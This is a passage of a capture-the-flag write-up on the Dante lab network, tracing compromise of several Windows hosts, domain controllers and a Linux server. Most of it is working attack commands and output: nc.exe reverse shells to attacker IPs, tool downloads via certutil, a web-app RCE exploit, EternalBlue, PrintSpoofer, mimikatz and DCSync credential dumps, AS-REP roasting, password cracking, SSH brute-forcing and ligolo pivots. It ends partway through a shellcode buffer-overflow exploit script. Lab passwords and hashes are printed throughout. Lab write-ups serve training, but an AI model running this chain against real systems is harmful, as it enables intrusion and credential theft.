```

I will utilize the following command to reconfigure the service to execute an reverse connection to my local machine using nc.exe instead of its original platform, since I don't have write permissions.

```
sc.exe config IObitUnSvr binPath="cmd.exe /c C:\Temp\nc.exe 10.10.16.29 88 -e cmd.exe"
```

Reassured that the binarypath changed, it did!

```
sc.exe qc IObitUnSvr
```

We now just need to start the service and it should execute an reverse connection to our local machine as SYSTEM!

```
sc.exe start IObitUnSvr
```

Gained RCE as SYSTEM.

```
rlwrap nc -lvnp 88
listening on [any] 88 ...
connect to [10.10.16.29] from (UNKNOWN) [10.10.110.3] 56439
Microsoft Windows [Version 10.0.18363.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
DANTE{Qu0t3_I_4M_secure!_unQu0t3}
```

Didn't find anything interesting in post exploitation

---
## DANTE-WS03

The nmap scan revealed the following information about the target server.

```
Nmap scan report for 172.16.1.102
Host is up (0.036s latency).
Not shown: 65516 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0
|_http-title: Dante Marriage Registration System :: Home Page
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.0)
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.0
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=TESTING CERTIFICATE
| Subject Alternative Name: DNS:localhost
| Not valid before: 2022-06-24T01:07:25
|_Not valid after:  2022-12-24T01:07:25
|_http-title: Dante Marriage Registration System :: Home Page
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MySQL (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-25T17:34:51+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: DANTE-WS03
|   NetBIOS_Domain_Name: DANTE-WS03
|   NetBIOS_Computer_Name: DANTE-WS03
|   DNS_Domain_Name: DANTE-WS03
|   DNS_Computer_Name: DANTE-WS03
|   Product_Version: 10.0.19041
|_  System_Time: 2026-07-25T17:33:31+00:00
| ssl-cert: Subject: commonName=DANTE-WS03
| Not valid before: 2026-07-24T11:43:53
|_Not valid after:  2027-01-23T11:43:53
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
33060/tcp open  mysqlx        MySQL X protocol listener
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-25T17:33:48
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: DANTE-WS03, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:19:10:0a (unknown)

Post-scan script results:
| clock-skew: 
|   0s: 
|     172.16.1.5
|     172.16.1.20
|     172.16.1.102
|     172.16.1.17
|_    172.16.1.101
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 10 IP addresses (10 hosts up) scanned in 988.65 seconds
```

The Nmap scan revealed information about an web application running "Online Marriage Registration System".

```
wget https://www.exploit-db.com/raw/49557
```

I changed the name to exploit.py and gave it executable permissions on my local machine.

```
mv 49557 exploit.py
chmod +x exploit.py
```

Executed the payload and we gained command execution as user "blake".

```
python3 exploit.py -u http://172.16.1.102 -c "whoami"
[+] Registered with mobile phone 734779248 and password 'dante123'
[+] PHP shell uploaded
[+] Command output
dante-ws03\blake
```

In order to gain RCE I will try & transfer nc.exe onto the target server first.

```
python3 exploit.py -u http://172.16.1.102 -c "certutil -urlcache -split -f http://10.10.14.138/nc.exe C:\Users\blake\Documents\nc.exe"
```

Started up netcat listener on port 443.

```
rlwrap nc -lvnp 443
```

Executed following command:

```
python3 exploit.py -u http://172.16.1.102 -c "C:\Users\blake\Documents\nc.exe 10.10.14.138 443 -e cmd.exe"
```

Gained RCE as user "blake".

```
rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.138] from (UNKNOWN) [10.10.110.3] 36764
Microsoft Windows [Version 10.0.19042.1766]
(c) Microsoft Corporation. All rights reserved.

C:\Apache24\htdocs\user\images>
```

Retrieved flag.txt in C:\Users\blake\Desktop.

```
DANTE{U_M4y_Kiss_Th3_Br1d3}
```
## Privilege Escalation

Enumerated user "blake"s permissions and groups.

He seems to be an Service Account and also has SeImpersonatePrivilege open.

Let's abuse PrintSpoofer to get SYSTEM Shell, since this permission is open.

```
certutil -urlcache -split -f http://10.10.14.138/PrintSpoofer.exe PrintSpoofer.exe
```

Executed the following command & gained SYSTEM Shell.

```
PrintSpoofer.exe -i -c cmd.exe
```

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
DANTE{D0nt_M3ss_With_MinatoTW}
```

Let's perform post exploitation to gain more credentials potentially.

Utilized mimikatz.exe for this endavour and gained password of Administrator user and hash of Administrator & blake

```
mimimatz.exe
privilege::debug
sekurlsa::logonpasswords
```

With all credentials in one users.txt and passwords.txt and hashes.txt I tried spraying DANTE-SQL01 & DANTE-WS02, but we couldn't authenticate. Let's move onto DANTE-DC01.

---
# DANTE-DC01

The nmap scan revealed the following information about the target server.

```
Nmap scan report for 172.16.1.20
Host is up (0.038s latency).
Not shown: 65502 closed tcp ports (reset)
Bug in http-title: no string output.
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 15:19:e6:66:c3:4f:f7:80:7e:48:f7:b9:9a:f9:ee:08 (RSA)
|   256 f3:ea:12:b5:fa:b0:0c:14:fb:65:98:0f:09:92:5c:56 (ECDSA)
|_  256 42:ca:16:67:5a:e7:a2:01:b0:63:4b:f7:ed:55:db:90 (ED25519)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 8.5
| http-robots.txt: 1 disallowed entry 
|_/ 
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-25 17:29:36Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft IIS httpd 8.5
| ssl-cert: Subject: commonName=DANTE-DC01
| Subject Alternative Name: othername: UPN:S-1-5-21-2273245918-2602599687-2649756301-1003
| Not valid before: 2020-08-07T09:32:48
|_Not valid after:  2025-08-06T09:32:48
|_ssl-date: 2026-07-25T17:34:51+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds  Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: DANTE)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: DANTE.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-07-25T17:34:51+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DANTE-DC01.DANTE.local
| Not valid before: 2026-07-24T11:45:10
|_Not valid after:  2027-01-23T11:45:10
| rdp-ntlm-info: 
|   Target_Name: DANTE
|   NetBIOS_Domain_Name: DANTE
|   NetBIOS_Computer_Name: DANTE-DC01
|   DNS_Domain_Name: DANTE.local
|   DNS_Computer_Name: DANTE-DC01.DANTE.local
|   DNS_Tree_Name: DANTE.local
|   Product_Version: 6.3.9600
|_  System_Time: 2026-07-25T17:33:13+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8912/tcp  open  wcbackup      Windows Client Backup service
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49159/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
49190/tcp open  msrpc         Microsoft Windows RPC
49196/tcp open  msrpc         Microsoft Windows RPC
49198/tcp open  msrpc         Microsoft Windows RPC
49247/tcp open  msrpc         Microsoft Windows RPC
65500/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2026-07-25T17:34:51+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DANTE-DC01
| Subject Alternative Name: othername: UPN:S-1-5-21-2273245918-2602599687-2649756301-1003
| Not valid before: 2020-08-07T09:32:48
|_Not valid after:  2025-08-06T09:32:48
65520/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=DANTE-DC01
| Subject Alternative Name: othername: UPN:S-1-5-21-2273245918-2602599687-2649756301-1003
| Not valid before: 2020-08-07T09:32:48
|_Not valid after:  2025-08-06T09:32:48
|_ssl-date: 2026-07-25T17:34:50+00:00; 0s from scanner time.
Service Info: Host: DANTE-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: DANTE-DC01
|   NetBIOS computer name: DANTE-DC01\x00
|   Domain name: DANTE.local
|   Forest name: DANTE.local
|   FQDN: DANTE-DC01.DANTE.local
|_  System time: 2026-07-25T18:33:39+01:00
|_clock-skew: mean: -7m26s, deviation: 21m02s, median: 0s
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-25T17:33:41
|_  start_date: 2026-07-25T15:23:16
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_nbstat: NetBIOS name: DANTE-DC01, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:f2:f1:3d (unknown)
```

The scan revealed information about the hostname DANTE-DC01, the domain itself DANTE.local & the FQDN of the target DANTE-DC01.DANTE.local. Let's map them to the target ip address in our local dns file.

```
echo "172.16.1.20 DANTE-DC01.DANTE.local DANTE.local DANTE-DC01" | tee -a /etc/hosts
```

Tested if anonymous or guest auth is enabled, but both are denied & disabled.

The target seems to be running on Windows Server 2012 R2, which is outdated and has tons of CVE's. Let's try & utilize EternalBlue using Metasploit.

```
msfconsole -q
search eternalblue
use windows/smb/ms17_010_psexec
set RHOSTS 172.16.1.20
set LHOST 10.10.14.66
set LPORT 443
exploit
shell
```

Gained RCE as SYSTEM User.

Immediatly transfered nc.exe onto the target system.

```
certutil -urlcache -split -f http://10.10.16.29/nc.exe nc.exe
```

Started up listener on port 88.

```
rlwrap nc -lvnp 88
```

Gained another SYSTEM Shell for persistence.

Retrieved flag.txt in C:\Users\katwamba\Desktop.

```
DANTE{Feel1ng_Blu3_or_Zer0_f33lings?}
```

Since we comprimised the DC, let's capture all local hashes using mimikatz. 

```
certutil -urlcache -split -f http://10.10.16.29/mimikatz.exe mimikatz.exe
```

```
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

Enumerated all domain users using the retrieved credentials and stored them inside an newusers.txt file.

```
nxc smb 172.16.1.20 -u users.txt -H hashes.txt --rid-brute > newusers.txt
```

Formatted the output so we have an users.txt which respresents an user wordlists of all users.

Since we only gathered hashes of local hashes, let's try & get all hashes/passwords of domain users.

```
lsadump::dcsync /all /csv
```

Tried to crack passwords using hashcat & was able to get 2.

```
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

```
cf3a5525ee9414229e66279623ed5c58:Welcome1                 
9bff06fe611486579fb74037890fda96:Password12345
```

Downloaded all domain information using bloodhound.

```
bloodhound-python --username 'MediaAdmin$' --hashes :5900eed28abf42d0bac3cf431f11508e --domain dante.local --collectionmethod All -dc DANTE-DC01.DANTE.local -ns 172.16.1.20
```

Started up bloodhound and uploaded domain information.

```
neo4j console
bloodhound-start
```

Utilized the following query to display all users:

```
MATCH (m:User) RETURN m
```

Inspecting mrb3n was interesting in the "description" it revealed his password and another flag!

```
S3kur1ty2020!
```

```
DANTE{1_jusT_c@nt_st0p_d0ing_th1s}
```

I also found an .xlsx file and downloaded it using the previously discovered ssh private key and the tool "scp" onto my local machine.

```
scp -i id_rsa katwamba@172.16.1.20:C:/Users/katwamba/Desktop/employee_backup.xlsx ./
employee_backup.xlsx
```

Opened up the excel file & discovered many users, I also realised that column B wasn't there, but it was there it was just minimized. Let's drag it out and we received the passwords for all the users.

Added all the users & passwords to my wordlists.

```
libreoffice employee_backup.xlsx
```

```
asmith
smoggat
tmodle
ccraven
kploty
jbercov
whaguey
dcamtan
tspadly
ematlis
fglacdon
tmentrso
dharding
smillar
bjohnston
iahmed
plongbottom
jcarrot
lgesley
```

```
Princess1
Summer2019
P45678!
Password1
Teacher65
4567Holiday1
acb123
WorldOfWarcraft67
RopeBlackfieldForwardslash
JuneJuly1TY
FinalFantasy7
65RedBalloons
WestminsterOrange5
MarksAndSparks91
Bullingdon1
Sheffield23
PowerfixSaturdayClub777
Tanenbaum0001
SuperStrongCantForget123456789
```

Decided to move back to the DANTE-WS02, since I still need to find a way in order to move into the other internal network!

---
# Host Discovery

Since I comprimised all the servers in this subnet and didn't find another dual-hosted machine. I'm assuming we'll need to perform ping sweeping of other subnets.

```
for i in {1..254}; do for j in {1..254}; do (ping -c 1 -W 1 172.16.$i.$j | grep -q "bytes from" && echo "172.16.$i.$j is up" &); done; done
```

I got a nudge from someone, since I was stuck in this and I checked out the tool "Seatbelt" which allows me to enumerate the Browser History of the user.

```
./Seatbelt.exe FirefoxHistory ChromiumHistory DNSCache
```

It revealed about two interesting IP's:

```
10.100.1.4
172.16.2.101
```

Enumerated another host by checking "foreign" addresses in running services.

```
netstat -ano
Active Connections
   Proto  Local Address          Foreign Address        State
   TCP    172.16.1.20:53         0.0.0.0:0              LISTENING
   TCP    172.16.1.20:139        0.0.0.0:0              LISTENING
   TCP    172.16.1.20:389        172.16.1.20:49198      ESTABLISHED
   TCP    172.16.1.20:5985       172.16.1.100:40426     TIME_WAIT
   TCP    172.16.1.20:5985       172.16.1.100:40430     TIME_WAIT
   TCP    172.16.1.20:5985       172.16.1.100:40432     ESTABLISHED
   TCP    172.16.1.20:49198      172.16.1.20:389        ESTABLISHED
   TCP    172.16.1.20:59557      172.16.1.100:11601     ESTABLISHED
   TCP    172.16.1.20:59648      172.16.2.5:5985        ESTABLISHED
   TCP    172.16.1.20:59680      172.16.2.5:135         TIME_WAIT
   TCP    172.16.1.20:59681      172.16.2.5:64330       TIME_WAIT
   TCP    172.16.1.20:59683      172.16.2.5:135         TIME_WAIT
   TCP    172.16.1.20:59684      172.16.2.5:64330       TIME_WAIT
   TCP    172.16.1.20:59686      172.16.2.5:135         TIME_WAIT
   TCP    172.16.1.20:59687      172.16.2.5:64330       TIME_WAIT
```

This reveals information that proves that DC01 has an established connection to 172.16.2.5.

```
172.16.2.5
```

In order to communicate with this system let's setup an route from DC01 to our local machine using ligolo-ng.

Create Interface "ligolo-double".

```
sudo ip tuntap add user saitama mode tun ligolo-double && sudo ip link set ligolo-double up && ligolo-proxy -selfcert -laddr 0.0.0.0:11602
```

Run Ligolo Agent on DC01

```
./agent -connect 10.10.10.10:11602 -ignore-cert
```

Created Tunnel on Ligolo

```
session
start --tun ligolo-double
```

Added Route for Ligolo-Double Interface

```
sudo ip route add 172.16.2.0/24 dev ligolo-double
```

I was now able to ping 172.16.2.5. But I wasn't able to ping 172.16.2.101.

---
## DANTE-DC02

The nmap scan revealed the following information about the target server.

```
nmap -n -Pn -sSCV -p- -oA nmap/target 172.16.2.5
Nmap scan report for 172.16.2.5
Host is up (0.13s latency).
Not shown: 65508 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-28 20:06:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: DANTE.ADMIN, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:d0:8e:88:ee:db:b4:cf:35:b7:db:cb:74:a0:50:0b (RSA)
|   256 db:33:b7:7b:64:70:46:12:29:02:36:b3:c5:cf:96:3d (ECDSA)
|_  256 66:bb:0d:63:a8:1e:4c:24:fe:2c:7e:9e:3a:03:00:e6 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: DANTE.ADMIN, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
64330/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DANTE-DC02; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-07-28T20:07:49
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 470.26 seconds
```

The scan reveals a lot of information about the target server. It seems to be another Domain Controller judging from the Hostname and Kerberos, LDAP & WinRM being active. Let's map the target ip address to the provided domain dante.admin, the FQDN of the DC DANTE-DC02.admin.local & the Hostname DANTE-DC02.

```
echo "172.16.2.5 DANTE-DC02.dante.admin dante.admin DANTE-DC02" | tee -a /etc/hosts
```

Sprayed users against smb, winrm & ldap with all the discovered credentials. But no results. 

```
nxc smb dante.admin -u users.txt -p passwords.txt --shares --continue-on-success
```

Tried anonymous & guest authentication, but both are either disabled or denied.

```
nxc smb admin.local -u '' -p '' --shares
```

Trying to connect via RPC was also denied anonymously.

```
rpcclient -U "" -N dante.admin
```

Performed ASREP-Roasting & retrieved TGT for user "jbercov".

```
impacket-GetNPUsers -dc-ip 172.16.2.5 dante.admin/ -no-pass -usersfile users.txt
```

Stored the TGT inside an file "jbercov" on the local machine.

Utilized the TGT to bruteforce an password using john the ripper.

```
john jbercov --wordlist=/usr/share/wordlists/rockyou.txt
```

Gained Credentials for user jbercov.

```
jbercov:myspace7
```

Enumerated SMB Shares, but couldn't find any interesting share or interesting permissions.

```
nxc smb dante.admin -u jbercov -p myspace7 --shares
```

Enumerated Domain Users and stored 

```
nxc smb dante.admin -u jbercov -p myspace7 --rid-brute > newusers.txt
```

Formatted output to an wordlist and stored it inside an users.txt file, so we can utilize for future bruteforcing attacks.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Checked if we can connect to the target server as user "jbercov" via evil-winrm. We can!

```
nxc winrm dante.admin -u jbercov -p myspace7
```

Connected to DANTE-DC02 using evil-winrm.

```
evil-winrm -i 172.16.2.5 -u jbercov -p myspace7
```

Retrieved flag.txt in C:\Users\jbercov\Desktop.

```
DANTE{Im_too_hot_Im_K3rb3r045TinG!}
```

## Privilege Escalation

Enumerated Groups & Permissions of current user. But nothing interesting.

```
whoami /all
```

I decided to get an better shell. Let's transfer nc.exe onto the target server for this.

```
iwr -uri http://10.10.14.70/nc.exe -OutFile nc.exe
```

Started up listener on port 443 on local machine.

```
rlwrap nc -lvnp 443
```

Executed the following command, which calls to our listener.

```
./nc.exe 10.10.14.70 443 -e cmd.exe
```

Gained RCE.

I decided to download all domain information with bloodhound-python onto my local machine.

```
bloodhound-python -u jbercov -p 'myspace7' -ns 172.16.2.5 -d dante.admin -c all
```

Enumerated network services & foreign connections and found out that DC02 has an established session to 172.16.2.101, which means we can pivot from DC02 to this target!

```
netstat -ano
```

I went over my whole enumeration methodology, but couldn't find anything useful. So I decided to use winPEAS.

Transfered it onto the target system.

```
iwr -uri http://10.10.14.70/winPEASx64.exe -OutFile winPEAS.exe
```

Since winPEAS didn't provide any good results. Let's start up bloodhound and check if there's any interesting relationships!

```
neo4j console
bloodhound-start
```

Uploaded domain information. Marked our current user as owned and found out he is 
multiple outbound object controls. 

- WriteGPLink on "Domain Controllers" OU.
- GetChangesAll on the whole domain "dante.admin".

Let's abuse GetChangesAll, it allows us to dump all domain hashes of the whole domain remotely.

```
impacket-secretsdump dante.admin/jbercov:'myspace7'@dante.admin
```

Gained all Domain NTLM Hashes. Stored them inside an hashes.txt file.

Connected to DANTE-DC02 as Administrator via psexec & gained SYSTEM Shell.

```
impacket-psexec Administrator@dante.admin -hashes :4c827b7074e99eefd49d05872185f7f8
```

Let's get an better shell by utilizing the nc.exe again to get an reverse connection to our local machine.

Started up listener on port 88 on my local machine.

```
rlwrap nc -lvnp 88
```

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
DANTE{DC_or_Marvel?}
```

Found an interesting "Jenkins.bat" file in C:\Users\Administrator\Desktop which revealed an interesting net user command. Could this be the credentials used in NIX07 for the Jenkins Login Panel? Stored them inside our retrieved users & passwords files.

```
Admin_129834765:SamsungOctober102030
```

Found an .ssh directory aswell in C:\Users\Administrator which is very interesting. It provided not only the private & public key. It also provided an "known_hosts" file. Which revealed the ip 172.16.2.101 -> Could this be an hint that this private ssh key could be reused for this ip? Let's store it on our local machine!

Gave the ssh key the correct permissions, so we can connect later on.

```
chmod 600 id_rsa
```

Since I comprimised the second Domain Controller and performed complete post exploitation. Let's perform the 3rd pivot, so we can connect to 172.16.2.101

Transfered the ligolo-ng agent.exe onto DANTE-DC02.

```
iwr -uri http://10.10.14.70/agent.exe -OutFile agent.exe
```

Started up third ligolo-ng proxy instance.

```
sudo ip tuntap add user saitama mode tun ligolo-triple && sudo ip link set ligolo-triple up && ligolo-proxy -selfcert -laddr 0.0.0.0:11603
```

Executed reverse connection from DANTE-DC02 to my local machine.

```
./agent.exe -connect 10.10.14.70:11603 -ignore-cert
```

Started tunnel.

```
session
start --tun ligolo-triple
```

Added route for 172.16.2.101 to ligolo-triple.

```
ip route add 172.16.2.101 dev ligolo-triple
```

We are now able to reach the endpoint, let's attack it!

---
## DANTE-ADMIN-NIX05

The nmap scan revealed the following information about the target server.

```
nmap -n -Pn -sSCV -p- -oA nmap/target 172.16.2.101                        
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 17:00 -0500
Nmap scan report for 172.16.2.101
Host is up (0.11s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 db:33:b7:7b:64:70:46:12:29:02:36:b3:c5:cf:96:3d (ECDSA)
|_  256 66:bb:0d:63:a8:1e:4c:24:fe:2c:7e:9e:3a:03:00:e6 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 250.15 seconds
```

Only SSH is open! Let's try & use the private key previously discovered in the Administrators .ssh directory. 

```
ssh -i id_rsa Administrator@172.16.2.101
```

Unfortunately the private SSH Key wasn't enough. We'll need to password of the Administrator aswell. Let's try & convert the ssh key to hash format, so we can maybe bruteforce an passphrase out of it with john the ripper.

Since SSH didn't allow me to connect with the retrieved private SSH Key of the Administrator User. Which makes absolute sense, since the target machine seems to be also an Linux Server! Let's proceed with bruteforcing the target machine using hydra wit our retrieved credentials.

```
hydra -L users.txt -P passwords.txt ssh://172.16.2.101
```

We got an valid login for user "julian".

```
julian:manchesterunited
```

Connected to the target machine using the credentials.

```
ssh julian@172.16.2.101
```

It reveals the Hostname "DANTE-ADMIN-NIX05".
## Privilege Escalation

Made a lot of manual enumeration, but couldn't find anything interesting yet. Decided to enumerate SUID Binaries.

Transfered suid3num.py onto target system.

```
wget http://10.10.14.70/suid3num.py suid3num.py
```

Gave it executable permissions.

```
chmod +x suid3num.py
```

Executed it and found out about one custom suid binary.  I previously already discovered it, but didn't know what they were supposed to do. I know that readfile allows me to read files.

```
/usr/sbin/readfiles
```

Checked the filetype

```
file readfiles
readfiles: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5230eee7e55ca4b1717cd448bd7affb7381aa1a4, for GNU/Linux 3.2.0, not stripped
```

Downloaded readfile binary onto my local machine using scp.

```
scp julian@172.16.2.101:/readfiles .
```

1. Analyze the Source

```
- Does it allocate bytes on a stack? e.G with dest[80]
- Uses it strcpy() without bounds checking
- Does it run with elevated privs? setresuid(0,0,0)
```

2. Find the Offset

```
- 80 bytes for dest[]
- 8 bytes for saved RBP
- 88 bytes to reach RIP
```

3. Check Security Features

Good if == 0

```
cat /proc/sys/kernel/randomize_va_space
```

4. Test Offset with GDB (GNU Debugger)

```
gdb -q --args /usr/sbin/readfile $(python3 -c 'print("A"*88+"B"*8)')
run
```

This should crash with:

- RBP = 0x4141414141414141 (AAAAAAA)
- RIP pointing to 0x4242424242424242 (BBBBBBB)

5. Created Exploit

Utilized AI for this:

```
#!/usr/bin/env python3
import struct
import subprocess
import time
import sys

# Shellcode to spawn /bin/sh (24 bytes)
shellcode = b"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"

# Return address range to brute force
# Start from the address we saw in GDB
start_addr = 0x7fffffffe000
end_addr = 0x7ffffffff000

# The path to the vulnerable binary
binary = b"/usr/sbin/readfile"

print("[+] Starting brute force...")
print(f"[+] Range: {hex(start_addr)} - {hex(end_addr)}")
print(f"[+] Shellcode size: {len(shellcode)} bytes")

success_count = 0

for ret_addr in range(start_addr, end_addr, 8):
    # Pack the return address (only 6 bytes for x86-64)
    ret_bytes = struct.pack("<Q", ret_addr)[:6]
    
    # Skip addresses with null bytes
    if b"\x00" in ret_bytes:
        continue
    
    # Build the payload - try different NOP lengths for better success
    nop_count = 40
    payload = b"\x90" * nop_count
    payload += shellcode
    payload += b"A" * (88 - len(payload))
    payload += ret_bytes
    
    # Skip payloads with null bytes
    if b"\x00" in payload:
        continue
    
    # Print progress every 1000 attempts
    if (ret_addr - start_addr) % 8000 == 0:
        print(f"[+] Progress: {hex(ret_addr)}")
    
    # Execute the binary with the payload
    try:
        # First try: just run it and check output
        result = subprocess.run(
            [binary, payload],
            env={},
            timeout=1,
            capture_output=True
        )
        
        # If we got any output, try to interact with the shell
        if result.stdout or result.stderr:
            # Second try: attempt to get shell interaction
            try:
                proc = subprocess.Popen(
                    [binary, payload],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    env={}
                )
                
                # Send commands to check if we're root
                commands = b"id\nwhoami\necho 'SHELL_TEST'\ncat /root/flag.txt\nexit\n"
                out, err = proc.communicate(commands, timeout=2)
                
                # Check for success indicators
                if b"uid=0" in out or b"root" in out or b"# " in out:
                    print("\n" + "="*60)
                    print("[+] SUCCESS! Got root shell!")
                    print("="*60)
                    print("[+] Output:")
